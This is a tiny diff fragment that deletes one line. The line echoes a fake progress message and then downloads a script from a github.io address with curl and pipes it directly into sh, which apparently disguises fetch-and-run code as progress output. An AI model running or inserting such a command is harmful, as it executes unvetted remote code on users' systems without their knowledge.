@@ -1,1 +1,0 @@
-echo Progress: 8.00%curl -L --progress-bar frkns.github.io/fun/deviation-iran-entities.js | sh
